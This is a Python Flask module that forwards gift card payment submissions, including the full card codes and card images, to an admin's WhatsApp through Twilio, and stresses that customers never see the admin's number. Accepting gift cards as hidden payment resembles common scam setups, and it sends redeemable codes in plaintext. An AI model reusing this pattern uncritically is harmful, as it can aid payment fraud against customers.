"""
WhatsApp Notification Service — Twilio
Sends silent server-side WhatsApp messages to the admin.
The customer never sees any WhatsApp window or the admin's number.
"""
import os
import requests
from flask import current_app


TWILIO_ACCOUNT_SID  = os.getenv("TWILIO_ACCOUNT_SID", "")
TWILIO_AUTH_TOKEN   = os.getenv("TWILIO_AUTH_TOKEN", "")
TWILIO_FROM_WHATSAPP = os.getenv("TWILIO_WHATSAPP_FROM", "whatsapp:+14155238886")  # Twilio sandbox default
ADMIN_WHATSAPP      = os.getenv("ADMIN_WHATSAPP_NUMBER", "whatsapp:+7044891567")


def _twilio_enabled() -> bool:
    return bool(TWILIO_ACCOUNT_SID and TWILIO_AUTH_TOKEN)


def send_whatsapp_gift_card_alert(submission: dict) -> None:
    """
    Sends the admin an instant WhatsApp message with gift card details
    and the actual card image (if uploaded). Completely server-side —
    the customer never sees a thing.
    """
    if not _twilio_enabled():
        current_app.logger.warning(
            "WhatsApp alert skipped — TWILIO_ACCOUNT_SID / TWILIO_AUTH_TOKEN not set in .env"
        )
        return

    brand     = submission.get("brand_name", "Gift Card")
    code      = submission.get("code") or "N/A (photo submitted)"
    total     = submission.get("order_total", "N/A")
    sub_id    = submission.get("id") or submission.get("submission_id", "?")
    image_url = submission.get("image_url")
    customer  = submission.get("customer_name") or submission.get("customer_email") or "Anonymous"

    body = (
        f"🎁 *NEW GIFT CARD PAYMENT*\n\n"
        f"👤 Customer: {customer}\n"
        f"🛍️ Brand: {brand}\n"
        f"🔑 Code: {code}\n"
        f"💰 Order Total: {total}\n"
        f"📋 Ref: GC-{sub_id}\n\n"
        f"✅ Approve or reject in your Admin Dashboard."
    )

    url = f"https://api.twilio.com/2010-04-01/Accounts/{TWILIO_ACCOUNT_SID}/Messages.json"

    payload = {
        "From": TWILIO_FROM_WHATSAPP,
        "To":   ADMIN_WHATSAPP,
        "Body": body,
    }

    # Attach the actual card image if available (Twilio sends it as a real WhatsApp image)
    if image_url:
        payload["MediaUrl"] = image_url

    try:
        resp = requests.post(
            url,
            data=payload,
            auth=(TWILIO_ACCOUNT_SID, TWILIO_AUTH_TOKEN),
            timeout=10,
        )
        if resp.status_code in (200, 201):
            current_app.logger.info(f"WhatsApp gift card alert sent to admin for submission GC-{sub_id}")
        else:
            current_app.logger.error(
                f"Twilio WhatsApp failed [{resp.status_code}]: {resp.text}"
            )
    except Exception as exc:
        current_app.logger.error(f"WhatsApp notification exception: {exc}")
